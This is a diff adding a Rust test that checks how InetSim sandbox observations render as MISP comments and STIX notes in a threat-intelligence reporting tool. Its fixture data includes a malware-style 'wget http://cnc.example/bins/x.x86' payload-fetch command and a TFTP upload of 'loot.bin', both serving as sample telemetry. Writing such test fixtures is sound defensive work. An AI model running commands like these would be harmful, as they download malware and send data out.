@@ -631,6 +631,67 @@ fn a_scan_is_one_comment_in_misp_and_one_note_in_stix() {
 }
 
 #[test]
+fn inetsim_notes_are_misp_comments_and_stix_notes_that_label_stand_ins() {
+    let mut report = fixture();
+    report.inetsim = vec![
+        InetSimNote {
+            kind: "telnet-session".into(),
+            summary: "telnet session to 203.0.113.7:23: 2 logins tried".into(),
+            detail: vec!["wget http://cnc.example/bins/x.x86".into()],
+            stand_in: true,
+        },
+        InetSimNote {
+            kind: "tftp-upload".into(),
+            summary: "TFTP upload tftp://198.51.100.69/loot.bin".into(),
+            detail: Vec::new(),
+            stand_in: false,
+        },
+    ];
+    let event: serde_json::Value = serde_json::from_str(&misp::render(&report).unwrap()).unwrap();
+    let comments: Vec<(String, String)> = event["Event"]["Attribute"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|a| {
+            a["comment"]
+                .as_str()
+                .is_some_and(|c| c.starts_with("InetSim"))
+        })
+        .map(|a| {
+            (
+                a["value"].as_str().unwrap().to_owned(),
+                a["comment"].as_str().unwrap().to_owned(),
+            )
+        })
+        .collect();
+    assert_eq!(comments.len(), 2);
+    assert!(comments[0].0.contains("wget http://cnc.example/bins/x.x86"));
+    assert_eq!(
+        comments[0].1,
+        "InetSim telnet-session; stand-in served by InetSim"
+    );
+    assert_eq!(comments[1].1, "InetSim tftp-upload");
+    let bundle: serde_json::Value = serde_json::from_str(&stix::render(&report).unwrap()).unwrap();
+    let notes: Vec<&str> = bundle["objects"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|o| o["type"] == "note")
+        .filter_map(|o| o["abstract"].as_str())
+        .filter(|a| a.starts_with("InetSim"))
+        .collect();
+    assert_eq!(
+        notes,
+        [
+            "InetSim telnet-session (stand-in served by InetSim)",
+            "InetSim tftp-upload"
+        ]
+    );
+    // An empty list stays out of the JSON.
+    assert!(!fixture().to_json().unwrap().contains("\"inetsim\""));
+}
+
+#[test]
 fn misp_event_has_attributes_to_ids_only_for_matches_and_galaxy_tags() {
     let report = fixture();
     let value: serde_json::Value = serde_json::from_str(&misp::render(&report).unwrap()).unwrap();
